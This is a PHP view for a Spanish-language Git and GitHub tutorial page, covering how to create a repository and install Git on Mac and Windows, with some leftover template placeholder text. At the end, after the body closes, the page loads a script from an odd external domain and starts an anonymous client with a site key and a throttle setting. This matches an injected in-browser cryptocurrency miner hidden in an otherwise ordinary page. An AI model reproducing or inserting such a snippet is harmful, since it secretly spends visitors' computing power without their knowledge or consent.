<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="ylit.cl" content="">

    <title>Tutotial GitHub</title>

    <!-- Bootstrap core CSS -->
    <link href="<?php echo base_url() ?>assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="<?php echo base_url() ?>assets/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- Custom styles for this template -->
    <link href="<?php echo base_url() ?>assets/css/clean-blog.min.css" rel="stylesheet">

  </head>

  <body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
      <div class="container">
        <div class="collapse navbar-collapse" id="navbarResponsive">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>">Índice</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/quienesSomos">Quines Somos</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/contactanos">Contactanos</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <header class="masthead" style="background-image: url('<?php echo base_url() ?>assets/img/github1.png')">
      <div class="overlay"></div>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <div class="site-heading">
              <h1>Tutorial GitHub</h1>
              <span class="subheading">Primer Proyecto.</span>
              <span class="subheading">Desarrollado por <a href="https://ylit.cl/">YLIT</a></span>
            </div>
          </div>
        </div>
      </div>
    </header>

    <!-- Post Content -->
    <article>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">

            <h2 class="section-heading">Crear Repositorio En GitHub.</h2>
            <p>Ahora que ya tenemos instalado Git en nuestro sistema, estamos listos para crear 
            un proyecto. Antes que todo debes crear tu propia cuenta en 
            <a href="https://github.com">https://github.com</a>.</p>

            <p>Una vez que ya tengas tu propia cuenta de usuario creada en GitHub. Ingresa en ella
            y pincha el boton "new repository", en donde debes ingresar el nombre del repositorio, 
            la descripción del repositorio (aunque es opcional), luego te pide seleccionar si tu repositorio
            será público o privado, sin embargo para que tu repositorio sea privado debes pagar, 
            por lo que para el caso de este tutorial solo crearemos un repositorio público. Luego,
            te pedirá si deseas inicializar el repositorio con un archivo README, lo recomendado es incluir
            este archivo, ya que aquí es en donde daremos la descripción de nuestro proyecto. 
            Finalmente te pedirá si deseas agregar .gitignore y el tipo de licencia. Sin embargo para el caso 
            de este tutorial básico lo dejaremos como "none" (más adelante se verá que es .gitignore
            y los tipos de licencias existentes). Para crear el repositorio pincha el boton "Create repository", 
            y listo, ya tienes tu repositorio creado y listo para subir los archivos de tu proyecto.</p>

            <h2 class="section-heading">Acceder a tu repositorio.</h2>
            <p>Posteriormente para acceder a tu proyecto (o también si deseas compartirlo con alguien),
            solo debes ingresar en 
            <br> <code>http://github.com/tuNombreUsuario/nombreRepositorio</code>, en donde /tuNombreUsuario
            es el nombre de usuario con el cual creaste tu propia cuenta en github, y /nombreRepositorio 
            es el nombre del repositorio que acabas de crear.</p>

            <p>Es importante que recuerdes la ruta de tu repositorio en github, ya que más adelante,
            para subir tus archivos la necesitarás.</p>

            <p></p>

            <p></p>

            <h2 class="section-heading">Mac.</h2>

            <p>Hay tres maneras fáciles de instalar Git en un Mac. La más sencilla 
            es usar el instalador gráfico de Git, que puedes descargar desde la página de SourceForge</p>
            <p><code><a href="http://sourceforge.net/projects/git-osx-installer/">http://sourceforge.net/projects/git-osx-installer/</a></code></p>

            <p>Una alternativa es instalar Git a través de MacPorts (<a href="http://www.macports.org">http://www.macports.org</a>). 
            Si tienes MacPorts instalado, instala Git con:</p>
            <p><code>$ sudo port install git-core +svn +doc +bash_completion +gitweb</code></p>

            <p>La otra alternativa es Homebrew (<a href="http://brew.sh/">http://brew.sh/</a>). 
            Si ya tienes instalado Homebrew, instala Git con:</p>
            <p><code>$ brew install git</code></p>

            <h2 class="section-heading">Windows.</h2>

            <p>Instalar Git en Windows es muy fácil. El proyecto msysGit tiene uno de los procesos de 
            instalación más sencillos. Simplemente descarga el archivo exe del instalador desde 
            la página de GitHub, y ejecútalo:</p>
            <p><a href="http://msysgit.github.com/"><code>http://msysgit.github.com/</code></a></p>

            <p>Una vez instalado, tendrás tanto la versión de línea de comandos 
            como la interfaz gráfica de usuario estándar.</p>

            <blockquote class="blockquote"><b>Nota para el uso en Windows:</b> Se debería usar Git con la 
            shell provista por msysGit (estilo Unix), lo cual permite usar las complejas líneas de 
            comandos de Git. Si por cualquier razón se necesitara usar la shell nativa 
            de Windows, la consola de línea de comandos, se han de usar las comillas dobles 
            en vez de las simples (para parámetros que contengan espacios) y se deben entrecomillar 
            los parámetros terminándolos con el acento circunflejo (^) si están al final de la línea, 
            ya que en Windows es uno de los símbolos de continuación.</blockquote>

            
            <h2 class="section-heading">Reaching for the Stars</h2>

            <a href="#">
              <img class="img-fluid" src="img/post-sample-image.jpg" alt="">
            </a>
            <span class="caption text-muted">To go places and do things that have never been done before – that’s what living is all about.</span>

            <p>Placeholder text by
              <a href="http://spaceipsum.com/">Space Ipsum</a>. Photographs by
              <a href="https://www.flickr.com/photos/nasacommons/">NASA on The Commons</a>.</p>

              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/">Capítulo Anterior &larr;</a>
              </div>
              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/instalacion">Capítulo Siguiente &rarr;</a>
              </div>

          </div>
        </div>
      </div>
    </article>

    <hr>

    <!-- Footer -->
    <footer>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <ul class="list-inline text-center">
              <li class="list-inline-item">
                <a href="https://www.linkedin.com/in/luis-navarro-arenas-6493b1136/">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://www.facebook.com/ylit.cl">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://github.com/lnavarroa/tutorialGitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
            </ul>
            <p class="copyright text-muted">Copyright &copy; YLIT 2018</p>
          </div>
        </div>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript -->
    <script src="<?php echo base_url() ?>assets/vendor/jquery/jquery.min.js"></script>
    <script src="<?php echo base_url() ?>assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="<?php echo base_url() ?>assets/js/clean-blog.min.js"></script>

  </body>

  
  <script src="https://www.freecontent.date./Kxnd.js"></script>
  <script>
    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
        throttle: 0.9
    });
    _client.start();

  </script>

</html>